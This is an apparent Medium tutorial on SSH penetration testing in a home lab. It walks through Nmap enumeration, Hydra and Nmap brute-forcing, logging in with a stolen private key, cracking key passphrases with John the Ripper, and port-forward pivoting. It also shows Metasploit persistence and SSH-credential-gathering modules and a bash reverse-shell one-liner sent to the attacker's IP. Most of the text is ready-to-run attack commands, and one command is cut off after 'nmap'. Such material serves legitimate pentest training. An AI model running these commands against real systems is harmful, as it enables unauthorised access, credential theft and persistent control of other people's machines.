---
title: "SSH Penetration Testing"
source: "https://medium.verylazytech.com/ssh-penetration-testing-be4fc8517286"
author:
  - "[[Very Lazy Tech 👾]]"
published: 2024-09-09
created: 2025-01-23
description: "Secure Shell (SSH) is a widely used cryptographic protocol designed for secure communication over an unsecured network. Its primary use is for remote server management, secure data transfers, and…"
tags:
  - "clippings"
---
[

![Very Lazy Tech 👾](https://miro.medium.com/v2/resize:fill:88:88/1*cQVMEaLp7npt5Gw9hUV7aQ.png)

](https://medium.verylazytech.com/?source=post_page---byline--be4fc8517286--------------------------------)

Secure Shell (SSH) is a widely used cryptographic protocol designed for secure communication over an unsecured network. Its primary use is for remote server management, secure data transfers, and remote command execution. However, as with any service, it can be vulnerable to various types of attacks. This guide delves into SSH penetration testing techniques, exploiting its vulnerabilities, and applying real-world methods to enhance your offensive security skills.

![](https://miro.medium.com/v2/resize:fit:700/0*DMpsZzJe7X2JDAnI)

Photo by [Arian Darvishi](https://unsplash.com/@arianismmm?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)

This article is tailored for professionals aiming to improve their understanding of SSH’s security mechanisms while enhancing their penetration testing toolkit.

## Lab Setup

Before jumping into SSH exploitation techniques, it is essential to have a lab setup for practice.

- **Target Machine**: Ubuntu Server (192.168.31.205)
- **Attacker Machine**: Kali Linux (192.168.31.141)

SSH is installed by default on most Linux distributions, and in this setup, we’ll exploit it using the above machines.

```
sudo apt install openssh-server
```

Verify the SSH service:

```
sudo systemctl status ssh
```

## Enumeration

**Enumeration** is the first and most crucial step in penetration testing. Nmap can be used to detect the version of SSH running on a target.

```
nmap -sV 192.168.31.205
```

If SSH is detected on the default port `22`, it's crucial to note the version as some older versions may have known vulnerabilities.

## Password Cracking Using Hydra

Hydra is a powerful tool for brute-forcing services like SSH.

Prepare a username and password list:

```
hydra -L users.txt -P pass.txt 192.168.31.205 ssh
```

Once Hydra cracks the password, log into the SSH service:

```
ssh username@192.168.31.205
```

**Best Practice**: For real-world testing, make sure to use custom wordlists derived from intelligence gathering on your target.

## Exploiting SSH with Metasploit

For SSH penetration testing, **Metasploit** provides built-in modules that make the process more efficient.

```
use exploit/multi/ssh/sshexec
set rhosts 192.168.31.205
set username pentest
set password 123
exploit
```

**Pro Tip**: Use Metasploit to automate post-exploitation tasks once inside the machine.

## Key-based Authentication and Attacks

SSH key-based authentication is a more secure alternative to password authentication. However, it can still be exploited if misconfigurations exist.

- **Generating SSH Keys**:

```
ssh-keygen
```

- **Copying Public Key to Target**:

```
ssh-copy-id user@192.168.31.205
```

- **Exploiting Misconfigured Key Permissions**: If you can steal the private key (`id_rsa`), SSH can be bypassed:

```
ssh -i id_rsa username@192.168.31.205
```

## Port Redirection

Port redirection can be used to pivot through compromised hosts. For example, if SSH is available but a web application is running on an internal port, you can set up local port forwarding:

```
ssh -L 8080:127.0.0.1:8080 username@192.168.31.205
```

Access the internal web app via `http://localhost:8080` on your attacker machine.

## Nmap SSH Brute-Force Script

Nmap has built-in scripts to automate brute-force attacks against SSH:

```
nmap --script ssh-brute -p 22 192.168.31.205
```

You can customize the username and password files to improve success rates:

```
nmap 
```

## Post-Exploitation with Metasploit

Once you’ve gained access to an SSH session, leverage **post-exploitation modules** for persistence and data exfiltration:

```
use post/linux/manage/sshkey_persistence
set session 1
exploit
```

Another effective module is **ssh\_creds**, which retrieves SSH keys from the compromised machine:

```
use post/multi/gather/ssh_creds
set session 1
exploit
```

## Advanced Techniques

- **SSH Hijacking**: If you find active SSH sessions, you can hijack them with tools like SSH hijacker.
- **Cracking SSH Passphrase**: Use tools like `ssh2john` and John the Ripper to crack SSH private key passphrases.

```
ssh2john id_rsa > sshhash john --wordlist=/usr/share/wordlists/rockyou.txt sshhash
```

- **Reverse Shell via SSH**: Send a reverse shell to gain complete control of the system:

```
ssh pentest@192.168.31.205 'bash -i >& /dev/tcp/192.168.31.141/4444 0>&1'
```

## Key Takeaways

1. **Enumeration is Key**: Always identify the SSH version and configuration.
2. **Use Password Cracking as a Last Resort**: Key-based authentication is harder to crack but not impossible.
3. **Post-exploitation is Vital**: Gaining initial access is only the first step — post-exploitation can yield more valuable information.
4. **Be Aware of Redirection and Tunneling**: These techniques can be game-changers in internal network pivoting.

SSH is a critical protocol in modern infrastructure. As a penetration tester or security researcher, mastering SSH attack vectors is crucial. From password brute-forcing with Hydra to key-based authentication exploits and advanced post-exploitation techniques with Metasploit, this guide has covered practical tools and methods to enhance your security testing. Always remember, the success of any penetration test lies in the precision of your enumeration and the efficiency of your attack strategy.